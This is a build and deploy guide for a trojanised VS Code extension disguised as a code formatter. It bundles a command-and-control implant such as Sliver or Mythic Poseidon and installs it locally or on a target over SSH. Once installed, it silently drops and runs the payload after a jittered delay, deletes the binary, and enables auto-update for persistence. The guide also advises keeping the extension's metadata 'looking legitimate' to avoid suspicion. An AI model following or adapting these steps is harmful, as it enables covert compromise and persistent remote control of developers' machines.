# Build and Deploy Guide

## Prerequisites

- Node.js 18+ and npm
- A compiled payload binary (Mythic Poseidon, Sliver, etc.)
- `npx` available (ships with npm)

## Build

```bash
# 1. Place your payload binary
PAYLOAD_SOURCE=/path/to/your/agent bash build_extension.sh

# 2. Or place it manually
mkdir -p payload
cp /path/to/your/agent payload/agent
bash build_extension.sh
```

Output: `code-formatter-helper-1.2.4.vsix`

## Deploy

### Local install

```bash
code --install-extension code-formatter-helper-1.2.4.vsix --force
```

### Remote install via SSH

```bash
scp code-formatter-helper-1.2.4.vsix user@target:/tmp/
ssh user@target 'code --install-extension /tmp/code-formatter-helper-1.2.4.vsix --force'
```

### VS Code GUI

1. Open VS Code
2. `Ctrl+Shift+X` / `Cmd+Shift+X` (Extensions)
3. Click `...` menu
4. "Install from VSIX..."
5. Select the `.vsix` file

## Post-Installation

The extension activates on VS Code startup (`onStartupFinished` event).

1. Extension loads silently (no UI prompts)
2. After `delayMs + jitter` (default: 5-8s), payload is deployed
3. Payload is dropped to the OS-specific cache directory
4. Payload is executed via `nohup` (detached)
5. After `cleanupDelayMs` (default: 30s), the dropped binary is deleted
6. VS Code auto-update settings are enabled for persistence

## Verify

Check the payload process is running:

```bash
# macOS / Linux
ps aux | grep com.vscode.helper

# Check the drop location
ls -la ~/Library/Application\ Support/Code/User/cache/
```

Check your C2 framework for a new callback/beacon.

## Customize Extension Metadata

Edit `package.json` to change:
- `name` / `displayName` / `description`
- `publisher`
- `version`
- `icon` (place a 128x128 PNG at `media/icon.png`)
- Commands and configuration keys

Keep the metadata looking legitimate — choose a name that matches
a real category (formatters, linters, themes, language packs, etc.).
